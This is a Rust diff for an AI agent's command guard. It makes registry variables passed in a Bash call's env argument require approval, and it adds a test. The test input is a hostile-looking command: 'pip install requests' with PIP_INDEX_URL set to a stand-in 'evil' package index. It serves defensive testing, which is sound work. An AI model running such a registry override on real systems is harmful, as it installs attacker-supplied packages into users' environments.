@@ -1006,7 +1006,15 @@ fn cmd_guard_verdict(args: &Value, run_cwd: Option<&std::path::Path>) -> Option<
         std::path::Path::to_path_buf,
     );
     let cwd = args.get("cwd").and_then(Value::as_str);
-    Some(match crate::dep_gate::reason(cmd, cwd, &root) {
+    // C6: the call's `env` (applied after the scrub) can name a registry too.
+    let env: Vec<&str> = args
+        .get("env")
+        .and_then(Value::as_array)
+        .into_iter()
+        .flatten()
+        .filter_map(|e| e.get(0)?.as_str())
+        .collect();
+    Some(match crate::dep_gate::reason(cmd, &env, cwd, &root) {
         None => verdict,
         Some(why) => origin_cmdparse::Risk::NeedsApproval(match verdict {
             origin_cmdparse::Risk::NeedsApproval(prev) => format!("{prev}; {why}"),
@@ -14043,6 +14051,42 @@ mod wiring_tests {
             Some(run.path()),
         ));
         assert_eq!(out.outcome, Outcome::Allow, "declared in the run cwd: {}", out.reason);
+    }
+
+    /// C6 (final fix S4): a registry variable in the Bash call's `env`
+    /// argument needs approval like the `NAME=value` prefix form, even for a
+    /// declared package.
+    #[test]
+    fn cmd_guard_reads_registry_variables_from_the_env_argument() {
+        let _guard = ENV_LOCK.lock().unwrap_or_else(std::sync::PoisonError::into_inner);
+        std::env::remove_var("ORIGIN_CMD_GUARD");
+        let run = tempfile::tempdir().expect("tmp");
+        std::fs::write(run.path().join("requirements.txt"), "requests\n").expect("write");
+        let guard = |args: &Value| {
+            let rt = tokio::runtime::Builder::new_current_thread()
+                .build()
+                .expect("runtime");
+            rt.block_on(apply_cmd_guard(
+                Decision {
+                    outcome: Outcome::Allow,
+                    reason: "rule:Bash@project:allow".into(),
+                },
+                &rp_meta("Bash"),
+                args,
+                &args.to_string(),
+                &origin_permission::prompt::AlwaysDeny,
+                Some(run.path()),
+            ))
+        };
+        let plain = serde_json::json!({ "command": "pip install requests" });
+        assert_eq!(guard(&plain).outcome, Outcome::Allow, "declared");
+        let env: Value = serde_json::from_str(
+            r#"{"command":"pip install requests","env":[["PIP_INDEX_URL","https://evil/simple"]]}"#,
+        )
+        .expect("json");
+        let out = guard(&env);
+        assert_eq!(out.outcome, Outcome::Deny, "{}", out.reason);
+        assert!(out.reason.contains("PIP_INDEX_URL"), "{}", out.reason);
     }
 
     /// WS-D browser visual loop: the gate is OFF by default. With
